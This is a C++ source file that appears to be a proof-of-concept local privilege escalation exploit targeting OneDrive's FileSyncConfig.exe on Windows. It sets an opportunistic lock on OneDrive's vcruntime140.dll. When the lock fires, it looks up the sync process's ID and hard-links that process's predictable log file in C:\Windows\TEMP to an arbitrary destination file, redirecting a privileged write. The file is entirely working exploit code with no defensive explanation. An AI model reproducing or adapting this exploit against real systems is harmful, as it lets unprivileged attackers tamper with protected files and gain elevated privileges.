#include <stdio.h>
#include <Windows.h>
#include "stdafx.h"
#include "CommonUtils.h"
#include "FileOpLock.h"
#include "tlhelp32.h"


static FileOpLock* oplock = nullptr;
LPWSTR DestFile = L"C:\\test\\test.txt";
void CreateHardLink(LPWSTR src, LPWSTR dst);


DWORD GetTargetProcessId(LPWSTR ProcessName) 
{
	PROCESSENTRY32 pt;
	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnap, &pt)) { 
		do {
			if (!lstrcmpi(pt.szExeFile, ProcessName)) {
				CloseHandle(hsnap);
				return pt.th32ProcessID;
			}
		} while (Process32Next(hsnap, &pt));
	}
	CloseHandle(hsnap); 
	return 0;
}


// Handle OpLock
void HandleOplock()
{
	DebugPrintf("OpLock triggered, get pid\n");
	DWORD pid = GetTargetProcessId(L"FileSyncConfig.exe");
	printf("target pid: %d \n", pid);
	LPWSTR TargetFile = new WCHAR[256];
	wmemset(TargetFile, 0, 256);
	wsprintfW(TargetFile, L"C:\\Windows\\TEMP\\aria-debug-%d.log", pid);
	printf("CreateHardlink from %ws to %ws \n", TargetFile, DestFile);
	CreateHardLink(TargetFile, DestFile);
	printf("Done. \n");
}

void SetOpLock(LPWSTR target, LPWSTR share_mode) {

	printf("Setting OpLock, Waiting for Triggering.. \n");
	oplock = FileOpLock::CreateLock(target, share_mode, HandleOplock);
	if (oplock != nullptr)
	{
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	else
	{
		printf("Error creating oplock: %X\n", GetLastError());
	}
}


// CreateHardLink
void CreateHardLink(LPWSTR src, LPWSTR dst) {

	if (CreateNativeHardlink(src, dst)) {
		printf("Done \n");
	}
	else {
		printf("Error creating hardlink: %X \n", GetLastError());
	}
}


int main() {

	SetOpLock(L"C:\\Program Files (x86)\\Microsoft OneDrive\\19.222.1110.0006\\vcruntime140.dll", L"x");
	return 0;
}